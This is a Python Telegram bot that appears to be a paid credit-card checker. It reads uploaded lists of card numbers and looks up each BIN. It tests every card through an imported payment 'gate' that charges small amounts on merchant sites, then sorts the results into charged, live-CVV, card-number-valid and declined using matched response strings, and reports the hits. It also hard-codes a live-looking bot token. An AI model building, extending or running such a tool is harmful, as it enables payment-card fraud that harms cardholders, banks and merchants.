import requests
import random
from gatet1 import Tele1
from hit_sender  import hit
from hit_sender  import die
from hit_sender  import insufficient
from respo import send
import time
import threading
from colorama import Fore, Style
import telebot
from telebot import types
import subprocess
import concurrent.futures
import os
import re
import json

sto = {"stop":False}

token = "6535718693:AAFYOw057HWOOmFFZp--uf0POO5-Gxvou2g"
bot = telebot.TeleBot(token, parse_mode="HTML")
id = 5981397861
#id = 1747969985


def incorrect(cc):
    with open('ccn.txt', "a") as file:
	      file.write(cc + '\n')

def newres(cc):
    with open('newres.txt', "a") as file:
	      file.write(cc + '\n')

@bot.message_handler(commands=["start"])
def start(message):
    bot.reply_to(message, "Send the file now")
    sto.update({"stop": False})

@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def stop_callback(call):
    sto.update({"stop": True})
    bot.answer_callback_query(call.id, text='Stopping Bot. Please Wait 10 seconds')
    
@bot.message_handler(content_types=["document"])
def main(message):
    if sto["stop"]:
        bot.reply_to(message, "Bot is  stopped. restart with /start.")
    else:
        main_process(message)       
def main_process(message):
    username = message.from_user.username
    if id == message.from_user.id:
        username = message.from_user.username
        chat_id = message.from_user.id
        file_name = "combo.txt"
        folder_name = message.from_user.id
        folder_name = str(folder_name)
        folder_path = os.path.join(os.getcwd(), folder_name)
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, file_name)
        dd = 0
        live = 0
        ccn = 0
        ch = 0
        res = '...'
        ko = bot.send_message(chat_id, "Checking Your Cards...⌛")
        ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
        with open(file_path, "wb") as w:
            w.write(ee)

        try:
           with open(file_path, 'r') as file:
                lino = file.readlines()
                total = len(lino)
                t = total
                for cc in lino:
                    if sto["stop"]:
                      msg1 = 'Stopped Bot.'
                      bot.send_message(chat_id=chat_id, text=msg1)
                      break
                    try:
                        data = requests.get('https://lookup.binlist.net/' + cc[:6]).json()
                        ii = cc[:6]
                    except:
                        pass
                    try:
                        bank = (data['bank']['name'])
                    except:
                          bank = ('unknown')
                    try:
                          emj = (data['country']['emoji'])
                    except:
                          emj = ('unknown')
                    try:
                          do = (data['country']['name'])
                    except:
                          do = ('unknown')
                    try:
                          dicr = (data['scheme'])
                    except:
                          dicr = ('unknown')
                    try:
                          typ = (data['type'])
                    except:
                          typ = ('unknown')
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f" {cc} ", callback_data='u8')
                    cm0 = types.InlineKeyboardButton(f"{res}", callback_data='x')
                    cm2 = types.InlineKeyboardButton(f"CHARGED ✅ : {ch}  ", callback_data='x')
                    cm3 = types.InlineKeyboardButton(f"CVV ☑️ : {live}", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"CCN ❎:  {ccn} ", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"DECLINE ❌  : {dd} ", callback_data='x')
                    cm6 = types.InlineKeyboardButton(f"TOTAL CARD : {t} ", callback_data='x')
                    stop_button = types.InlineKeyboardButton("STOP", callback_data='stop')
                    mes.add(cm0, cm1, cm2, cm3, cm4, cm5, cm6, stop_button)
                    bot.edit_message_text(chat_id=chat_id, message_id=ko.message_id, text='''Checking with 1 Gate.
                    BOT 𝗕𝗬 ⇾ @word2048 ''', reply_markup=mes)
                    ip_address = ".".join(str(random.randint(0, 255)) for _ in range(4))
                    time.sleep(5)
                    def check_gateway(gateway):
                         try:
                             result2 = str(gateway(cc))
                             return result2
                         except Exception as e:
                             return str(e)
                    gateways = [Tele1]
                    with concurrent.futures.ThreadPoolExecutor() as executor:
                         results = list(executor.map(check_gateway, gateways))
      
                    for gateway, result2 in zip(gateways, results):
                        if gateway.__module__ == 'gatet':
                             gate = "Gatet 0"
                             amt = "10$"
                        elif gateway.__module__ == 'gatet1':
                              gate = "Gatet 1"
                              amt = "5.49$"
                        elif gateway.__module__ == 'gatet2':
                              gate = "Gatet 2"
                              amt = "25$"
                        elif gateway.__module__ == 'gatet3':
                              amt = "24.99£"
                              gate = "Gatet 3"
                        elif gateway.__module__ == 'gatet4':
                             amt = "990$"
                             gate = "Gatet 4"
                        elif gateway.__module__ == 'gatet5':
                              gate = "Gatet 5"
                              amt = "39.99$"
                        elif gateway.__module__ == 'gatet6':
                              gate = "Gatet 6"
                              amt = "24.99£"
                        elif gateway.__module__ == 'gatet7':
                              gate = "Gatet 7"
                              amt = "5$"
                        else:
                              gate = "Other gate"
                              
                        result2 = result2.lower()
                        """
                        response_json = json.loads(result2)
                        result = response_json.get("result")
                           
                           # Extract the specific message
                        message_match = re.search(r'<ul.*?<li>(.*?)<\/li>', response_json["messages"], re.DOTALL)
                        msg = message_match.group(1) if message_match else None
                        """
                        success_keys = [
                         "succeeded",
                         "cvc_check",
                         "membership confirmation",
                         "thank for your support!",
                         "thank you for your donation",
                         "/wishlist-member/?reg=",
                         "thank you",
                         "success",
                         "thank you. your order has been received.",
                        ]
                          
                        insufficient_keys = [
                          "insufficient funds.",
                          "your card has insufficient funds.",
                        ]
                          
                          
                        incorrect_keys = [
                          "security code is incorrect.",
                          "your card's security code is incorrect",
                          "error updating default payment method. your card's security code is incorrect.",
                          "the card number is incorrect",
                          "security code is invalid.",
                        ]
                     
                        failure_keys = [
                         "payment_intent_unexpected_state",
                         "incorrect_zip",
                         "transaction_not_allowed",
                         "stripe_3ds2_fingerprint",
                         "generic_decline",
                         "do_not_honor",
                         "fraudulent",
                         "intent_confirmation_challenge",
                         "your card was declined.",
                         "error updating default payment method. your card was declined.",
                         "invalid_cvc",
                         "card is declined by your bank, please contact them for additional information.",
                         "your card does not support this type of purchase.",
                         "your card is not supported.",
                         "dead",
                         "the card was declined.",
                         "this transaction has been declined",
                         "the card has expired",
                         "payment processing failed. please retry",
                        ]
                        found_match = False
                     
                        for key in success_keys:
                               if key in result2:
                                   print(Fore.GREEN + key + ' ' + gate + ' ' + cc + Style.RESET_ALL)
                                   found_match = True
                                   res = f"{key}"
                                   ch += 1
                                   send(amt, cc, ii, do, bank, emj, ip_address, gate, key, chat_id)
                                   hit(amt, cc, ii, do, bank, emj, gate, key, username)
                                   break
                           
                        for key in failure_keys:
                               if key in result2:
                                   print(Fore.RED + key + ' ' + gate + ' ' + cc + Style.RESET_ALL)
                                   found_match = True
                                   res = f"{key}"
                                   dd += 1
                                   break
                           
                        for key in insufficient_keys:
                               if key in result2:
                                   print(Fore.BLUE + key + ' ' + gate + ' ' + cc + Style.RESET_ALL)
                                   found_match = True
                                   res = f"{key}"
                                   live += 1
                                   send(amt, cc, ii, do, bank, emj, ip_address, gate, key, chat_id)   
                                   insufficient(amt, cc, ii, do, bank, emj, gate, key, username)
                                   break
                           
                        for key in incorrect_keys:
                               if key in result2:
                                   print(Fore.MAGENTA + key + ' ' + gate + ' ' + cc + Style.RESET_ALL)
                                   incorrect(cc)
                                   found_match = True
                                   res = f"{key}"
                                   ccn += 1
                                   send(amt, cc, ii, do, bank, emj, ip_address, gate, key, chat_id)   
                                   break
                           
                        if not found_match:
                               print(result2)
        except Exception as e:
              print(e)
    else:
          bot.reply_to(message, 'This bot is paid. You can buy\n send message @word2048')
print("working bot1")
bot.polling()